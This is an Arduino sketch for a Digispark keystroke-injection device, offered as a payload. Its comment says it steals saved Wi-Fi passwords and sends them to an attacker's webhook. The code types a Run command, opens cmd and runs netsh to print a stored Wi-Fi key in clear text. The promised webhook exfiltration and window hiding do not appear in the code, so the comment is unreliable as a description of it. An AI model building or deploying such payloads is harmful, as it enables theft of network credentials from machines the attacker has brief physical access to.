/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
 rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
*/


#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd"); //smallest cmd window possible
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
//  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
//  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan show profile name=\"SSID\" key=Clear | find \"Key Content\""); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(1000);
  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
